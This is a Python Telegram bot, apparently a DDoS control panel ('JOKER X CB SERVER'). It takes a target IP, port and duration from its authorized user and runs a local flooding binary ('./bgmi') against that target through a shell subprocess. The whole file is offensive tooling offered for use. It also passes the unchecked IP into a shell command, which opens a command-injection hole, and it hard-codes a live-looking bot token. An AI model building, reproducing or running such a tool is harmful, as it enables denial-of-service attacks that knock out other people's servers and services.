import os
import telebot
import logging
import signal
import time
import asyncio
from datetime import datetime
from telebot.types import ReplyKeyboardMarkup, KeyboardButton

# Manual Markdown escaping function
def escape_markdown(text, version=2):
    """Escapes special characters in Markdown text."""
    chars_to_escape = ['_', '*', '[', ']', '(', ')', '~', '`', '>', '#', '+', '-', '=', '|', '{', '}', '.', '!']
    for char in chars_to_escape:
        text = text.replace(char, f'\\{char}')
    return text

# Initialize the event loop
loop = asyncio.new_event_loop()
asyncio.set_event_loop(loop)

TOKEN = '7767960516:AAFbmQpq3oLRpZvri4Alz4zkdQG0zWvDnt4' 

AUTHORIZED_USER_ID = 842893299 

logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)

bot = telebot.TeleBot(TOKEN)

# Remove any existing webhook to avoid conflicts
bot.remove_webhook()

REQUEST_INTERVAL = 1
blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]

# Function to handle graceful termination
def stop_polling(signal, frame):
    bot.stop_polling()
    logging.info("Bot polling stopped gracefully.")
    exit(0)

# Set up signal handlers for graceful shutdown
signal.signal(signal.SIGINT, stop_polling)
signal.signal(signal.SIGTERM, stop_polling)

async def background_task():
    """Async task to keep the event loop running."""
    while True:
        await asyncio.sleep(REQUEST_INTERVAL)

# Run attack command asynchronously using cb binary
async def run_attack_command_async(target_ip, target_port, duration, chat_id):
    try:
        process = await asyncio.create_subprocess_shell(f"./bgmi {target_ip} {target_port} {duration} 250")
        await process.communicate()
        send_attack_finished_message(target_ip, target_port, duration, chat_id)
    except Exception as e:
        logging.error(f"Error in running attack command: {e}")

def send_attack_finished_message(target_ip, target_port, duration, chat_id):
    current_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    message = (f"*🚀 Attack finished 🚀*\n\n"
               f"Host: {target_ip}\n"
               f"Port: {target_port}\n"
               f"Duration: {duration} seconds\n"
               f"Time: {current_time}")
    try:
        bot.send_message(chat_id, message, parse_mode='Markdown')
    except telebot.apihelper.ApiException as e:
        logging.error(f"Failed to send message: {e}")

@bot.message_handler(commands=['Attack'])
def attack_command(message):
    user_id = message.from_user.id
    chat_id = message.chat.id

    # Check if the user is authorized before proceeding with attack command
    if user_id != AUTHORIZED_USER_ID:
        bot.send_message(chat_id, "*You are not authorized to use this command.*", parse_mode='Markdown')
        return

    # Directly proceed with the attack command
    bot.send_message(chat_id, "*🚀CB SERVER ACTIVE 🚀 \n\n Please provide host (IP), port number and duration (in seconds).*", parse_mode='Markdown')
    bot.register_next_step_handler(message, process_attack_command)

def process_attack_command(message):
    try:
        args = message.text.split()

        # Check if exactly 3 arguments are provided
        if len(args) != 3:
            bot.send_message(message.chat.id, "*Invalid command format. Please use: <target_ip> <target_port> <time>*", parse_mode='Markdown')
            return

        target_ip, target_port_str, duration_str = args

        # Validate target_port and duration are integers
        if not target_port_str.isdigit() or not duration_str.isdigit():
            bot.send_message(message.chat.id, "*Invalid port or time. Both must be numeric.*", parse_mode='Markdown')
            return

        # Convert port and duration to integers
        target_port = int(target_port_str)
        duration = int(duration_str)

        # Check if port is blocked
        if target_port in blocked_ports:
            bot.send_message(message.chat.id, f"*Port {target_port} is blocked. Please use a different port.*", parse_mode='Markdown')
            return

        # Run the attack command asynchronously using cb binary
        asyncio.run_coroutine_threadsafe(run_attack_command_async(target_ip, target_port, duration, message.chat.id), loop)
        
        bot.send_message(message.chat.id, f"*🚀 Attack started 🚀\n\nHost: {target_ip}\nPort: {target_port}\nTime: {duration}*", parse_mode='Markdown')

    except Exception as e:
        logging.error(f"Error in processing attack command: {e}")

@bot.message_handler(commands=['start'])
def send_welcome(message):
    user_id = message.from_user.id
    
    # Check if the user is authorized
    if user_id != AUTHORIZED_USER_ID:
        bot.send_message(message.chat.id, "*You are not authorized to use this bot.*", parse_mode='Markdown')
        return

    # Initialize the keyboard
    markup = ReplyKeyboardMarkup(row_width=2)

    # Add general button
    btn1 = KeyboardButton("🚀 Attack")

    # Add the button to the markup
    markup.add(btn1)

    bot.send_message(message.chat.id, "*🚀 JOKER X CB SERVER ACTIVE 🚀*", 
                     reply_markup=markup)

@bot.message_handler(func=lambda message: True)
def handle_message(message):
    user_id = message.from_user.id
    
    if message.text == "🚀 Attack":
        attack_command(message)
    else:
        bot.send_message(message.chat.id, "Unknown command. Please use the available options.")

def start_bot_polling():
    logging.info("JOKER X CB SERVER RUNNING...")
    
    try:
        bot.polling(none_stop=True)
         
    except telebot.apihelper.ApiException as e:
        logging.error(f"An error occurred: {e}")
        time.sleep(5)

if __name__ == "__main__":
    loop.run_in_executor(None, start_bot_polling)
    loop.run_until_complete(background_task())